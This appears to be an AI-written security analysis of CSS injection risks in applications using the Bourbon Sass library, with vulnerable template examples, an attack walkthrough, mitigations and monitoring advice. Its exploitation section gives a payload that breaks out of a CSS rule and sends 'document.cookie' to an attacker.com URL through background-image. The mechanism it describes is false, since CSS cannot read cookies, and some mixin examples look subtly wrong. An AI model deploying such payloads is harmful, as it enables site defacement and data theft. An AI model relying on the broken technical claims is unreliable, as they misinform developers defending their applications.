Okay, here's a deep analysis of the "CSS Injection" attack tree path, tailored for a development team using Bourbon, with a focus on practical mitigation and understanding:

## Deep Analysis: CSS Injection Attack Vector (Bourbon-based Application)

### 1. Define Objective

**Objective:** To thoroughly understand the "CSS Injection" attack vector within the context of a Bourbon-based application, identify specific vulnerabilities related to Bourbon's usage, analyze potential exploitation scenarios, and propose concrete mitigation strategies.  The ultimate goal is to provide actionable recommendations to the development team to prevent CSS injection attacks.

### 2. Scope

*   **Focus:**  This analysis focuses solely on the CSS Injection attack vector (Node 4 in the provided tree).
*   **Application Context:**  We assume the application uses the Bourbon library (https://github.com/thoughtbot/bourbon) for Sass mixins and utilities.  We'll consider how Bourbon's features *might* be misused or indirectly contribute to vulnerabilities.
*   **Bourbon Version:** We will consider the latest stable version of Bourbon, but also acknowledge potential issues in older versions if relevant.
*   **Exclusions:**  This analysis *does not* cover other attack vectors (e.g., SQL injection, direct XSS) except where they are directly related to CSS injection (e.g., CSS-based XSS in older browsers).  We are not performing a full code audit.

### 3. Methodology

1.  **Bourbon Feature Review:**  Examine Bourbon's documentation and source code to identify any features that could be relevant to CSS injection, even indirectly.  This includes mixins that handle user input or dynamically generate CSS.
2.  **Vulnerability Identification:**  Identify potential scenarios where user-supplied data could influence the output of Bourbon mixins or be directly injected into CSS.
3.  **Exploitation Scenario Analysis:**  Develop realistic attack scenarios, demonstrating how an attacker could exploit identified vulnerabilities.
4.  **Mitigation Strategy Development:**  Propose specific, actionable mitigation strategies, including code examples and best practices.
5.  **Detection and Monitoring:**  Suggest methods for detecting and monitoring potential CSS injection attempts.

### 4. Deep Analysis of Attack Tree Path: [[4. CSS Injection]]

#### 4.1 Bourbon Feature Review (Relevant to CSS Injection)

Bourbon, at its core, is a library of Sass mixins.  It *doesn't directly handle user input*.  However, the *way* developers use Bourbon can create vulnerabilities.  Here's a breakdown of potentially relevant areas:

*   **`@include` with User-Supplied Arguments:** The most significant risk comes from how developers use `@include` to call Bourbon mixins. If any argument to a mixin is derived from user input *without proper sanitization*, it creates a potential injection point.  This is the *primary* area of concern.
*   **Custom Mixins Built on Bourbon:** Developers often create their own custom mixins that leverage Bourbon.  These custom mixins are just as susceptible (if not more so) to injection if they handle user input improperly.
*   **`font-face` Mixin (Indirect Risk):** While not directly related to injection, the `font-face` mixin could be abused to load fonts from malicious sources if the font URL is derived from user input. This is more of a general security concern than a CSS injection issue, but worth mentioning.
*   **`linear-gradient` and `radial-gradient` (Indirect Risk):** Similar to `font-face`, if color stops or positions are derived from user input, an attacker could potentially inject malicious values, although the impact is likely limited to visual disruption.
* **`@content`:** Bourbon mixins that use `@content` allow for passing in blocks of styles. If the content of these blocks is influenced by user input, it's a direct injection point.

**Key Takeaway:** Bourbon itself isn't inherently vulnerable. The vulnerability lies in how developers integrate it with user-supplied data.

#### 4.2 Vulnerability Identification (Specific Scenarios)

Here are some concrete examples of how CSS injection could occur in a Bourbon-based application:

*   **Scenario 1: Customizable Themes (High Risk):**
    *   **Description:** The application allows users to customize their theme by selecting colors, fonts, or other visual properties. These selections are stored (e.g., in a database) and then used as arguments to Bourbon mixins.
    *   **Vulnerable Code (Example):**
        ```sass
        // user_preferences.scss.erb (Rails example)
        $user_background_color: <%= @user.preferences.background_color %>; // UNSAFE!
        $user_text_color: <%= @user.preferences.text_color %>; // UNSAFE!

        body {
          @include background-color($user_background_color);
          color: $user_text_color;
        }
        ```
    *   **Explanation:** If `@user.preferences.background_color` contains malicious CSS (e.g., `"!important; } body { display: none; } /*"`), it will be injected directly into the generated CSS, potentially breaking the layout or causing other issues.

*   **Scenario 2: User-Generated Content with Styling Options (High Risk):**
    *   **Description:**  Users can create content (e.g., forum posts, comments) and have limited styling options (e.g., bold, italic, colors).  The application uses these styling choices to generate CSS.
    *   **Vulnerable Code (Example):**
        ```sass
        // comment.scss.erb
        .comment {
          .user-content {
            color: <%= @comment.user_selected_color %>; // UNSAFE!
            @if @comment.user_wants_bold {
              font-weight: bold;
            }
            // ... other styling based on user input ...
          }
        }
        ```
    *   **Explanation:**  Similar to Scenario 1, if `@comment.user_selected_color` is not sanitized, an attacker could inject arbitrary CSS.

*   **Scenario 3: Dynamic CSS Generation Based on URL Parameters (Medium Risk):**
    *   **Description:** The application uses URL parameters to control some aspect of the styling (e.g., a "preview" mode).
    *   **Vulnerable Code (Example):**
        ```sass
        // preview.scss.erb
        $preview_width: <%= params[:width] %>px; // UNSAFE!

        .preview-container {
          @include size($preview_width, auto);
        }
        ```
    *   **Explanation:**  If `params[:width]` is not validated and sanitized, an attacker could inject CSS by manipulating the URL.

*   **Scenario 4: Misuse of `@content` (High Risk):**
    *   **Description:** A custom mixin accepts a block of styles via `@content`, and this block is influenced by user input.
    *   **Vulnerable Code (Example):**
        ```sass
        // _custom_mixins.scss
        @mixin user-styled-box($content) {
          .user-box {
            border: 1px solid black;
            @content;
          }
        }

        // page.scss.erb
        @include user-styled-box(<%= @user.custom_styles %>); // UNSAFE!
        ```
        *   **Explanation:** `@user.custom_styles` is a direct injection point for any CSS the attacker provides.

#### 4.3 Exploitation Scenario Analysis

Let's walk through a detailed exploitation of Scenario 1 (Customizable Themes):

1.  **Attacker's Goal:**  Deface the website or steal user cookies.
2.  **Vulnerability:**  The application uses user-provided color preferences directly in Bourbon mixins without sanitization.
3.  **Attack Steps:**
    *   The attacker signs up for an account.
    *   The attacker goes to the "Theme Settings" page.
    *   Instead of selecting a valid color, the attacker enters the following into the "Background Color" field:
        ```
        "!important; } body { background-image: url('https://attacker.com/steal.php?cookie=' + document.cookie); } /*"
        ```
    *   The application saves this malicious string to the database.
    *   When any user (including the attacker) views a page that uses this theme, the injected CSS is rendered.
4.  **Impact:**
    *   The `"!important; }"` breaks the intended CSS rule.
    *   The `body { ... }` injects a new rule that sets the background image of the entire page.
    *   The `background-image` URL points to a malicious script (`steal.php`) on the attacker's server.
    *   `document.cookie` is appended to the URL, sending the user's cookies to the attacker.
    *   The `/*"` comments out the rest of the original CSS rule, preventing syntax errors.

This is a classic example of CSS-based data exfiltration.  The attacker leverages the `background-image` property to make a request to their server, smuggling the user's cookies in the URL.

#### 4.4 Mitigation Strategies

The core principle of preventing CSS injection is **strict input validation and output encoding**.  Here are specific strategies:

*   **1.  Whitelist Allowed Values (Strongest):**
    *   **Description:**  Instead of trying to sanitize arbitrary input, define a *whitelist* of allowed values.  For example, for colors, provide a predefined set of color names or hex codes.
    *   **Implementation:**
        ```ruby
        # In your model (e.g., User)
        ALLOWED_COLORS = {
          "red" => "#FF0000",
          "blue" => "#0000FF",
          "green" => "#00FF00",
          # ... more colors ...
        }

        def background_color
          ALLOWED_COLORS[self.preferences.background_color_key] || "#FFFFFF" # Default to white
        end
        ```
        ```sass
        // user_preferences.scss.erb
        $user_background_color: <%= @user.background_color %>; // SAFE - uses whitelisted value
        ```
    *   **Benefits:**  This is the most secure approach because it completely eliminates the possibility of injection.

*   **2.  Strict Input Validation (If Whitelisting is Impossible):**
    *   **Description:**  If you *must* allow users to enter arbitrary values (e.g., for a custom CSS editor), implement rigorous validation.  This is *very difficult* to do correctly for CSS.
    *   **Implementation (Example - using a CSS parser/validator):**
        *   Use a robust CSS parser/validator library (e.g., `css-validator` in Node.js, or a similar library in your backend language).  These libraries can check for syntax errors and potentially identify malicious patterns.  **This is not foolproof.**
        *   **Never** rely on simple regular expressions for CSS validation.  CSS is a complex language, and regular expressions are easily bypassed.
    *   **Challenges:**  Maintaining a comprehensive CSS validator is extremely challenging due to the complexity and evolving nature of CSS.

*   **3.  Output Encoding (Limited Effectiveness):**
    *   **Description:**  Encode the user input before inserting it into the CSS.  This can help prevent some basic injection attempts, but it's not a reliable solution for CSS.
    *   **Implementation (Example - using HTML entity encoding):**
        ```ruby
        # In your view
        $user_background_color: <%= ERB::Util.html_escape(@user.preferences.background_color) %>;
        ```
    *   **Limitations:**  HTML entity encoding is designed for HTML, not CSS.  It won't prevent all CSS injection techniques, especially those that rely on valid CSS syntax.

*   **4.  Content Security Policy (CSP) (Essential):**
    *   **Description:**  Use a Content Security Policy (CSP) to restrict the sources from which the browser can load resources (including stylesheets, images, and scripts).  This is a *critical* defense-in-depth measure.
    *   **Implementation:**
        ```http
        Content-Security-Policy: style-src 'self'; img-src 'self';
        ```
        *   This CSP allows styles and images only from the same origin (`'self'`).  This would prevent the data exfiltration attack in our example because the browser would block the request to `attacker.com`.
        *   You may need to allow `'unsafe-inline'` for styles if you are generating CSS dynamically.  However, try to avoid this if possible.  If you must use `'unsafe-inline'`, combine it with a `nonce` or `hash` to allow only specific inline styles.
    *   **Benefits:**  CSP provides a strong layer of protection against various attacks, including CSS injection and XSS.

*   **5.  Avoid Inline Styles (Best Practice):**
    *   **Description:**  Whenever possible, avoid generating inline styles (`<div style="...">`) based on user input.  Instead, use CSS classes and dynamically add/remove those classes.
    *   **Benefits:**  This reduces the attack surface and makes it easier to manage and validate styles.

*   **6.  Regular Security Audits and Penetration Testing:**
    *   **Description:**  Conduct regular security audits and penetration testing to identify and address vulnerabilities.

*   **7.  Keep Bourbon Updated:**
     *   **Description:** Ensure you are using the latest stable version of Bourbon. While Bourbon itself is not the source of the vulnerability, updates may include security improvements or changes that affect how you use the library.

#### 4.5 Detection and Monitoring

*   **1.  Web Application Firewall (WAF):**
    *   A WAF can be configured to detect and block common CSS injection patterns.  However, WAFs can be bypassed, so they should not be the only line of defense.

*   **2.  Input Validation Logging:**
    *   Log all user input that is used to generate CSS.  This can help identify suspicious patterns and track down potential attacks.

*   **3.  CSP Violation Reports:**
    *   Configure your CSP to send reports when violations occur.  This can alert you to potential attacks or misconfigurations.

*   **4.  Security Monitoring Tools:**
    *   Use security monitoring tools to detect unusual activity, such as unexpected network requests or changes to the website's appearance.

### Summary and Recommendations

CSS injection in a Bourbon-based application is primarily a result of improperly handling user input when using Bourbon mixins.  Bourbon itself is not inherently vulnerable; the vulnerability lies in the developer's implementation.

**Key Recommendations for the Development Team:**

1.  **Prioritize Whitelisting:**  Use whitelists for user-configurable styling options whenever possible. This is the most effective way to prevent CSS injection.
2.  **Implement Strict Input Validation (If Necessary):** If whitelisting is not feasible, use a robust CSS parser/validator library.  Never rely on simple regular expressions.
3.  **Enforce Content Security Policy (CSP):**  Implement a strict CSP to limit the sources of styles and other resources. This is a crucial defense-in-depth measure.
4.  **Avoid Inline Styles:**  Prefer CSS classes over inline styles generated from user input.
5.  **Regular Security Audits:** Conduct regular security audits and penetration testing.
6.  **Log and Monitor:** Log user input and monitor for CSP violations and unusual activity.
7. **Keep Bourbon Updated:** Use the latest stable version of Bourbon.

By following these recommendations, the development team can significantly reduce the risk of CSS injection attacks and build a more secure application.
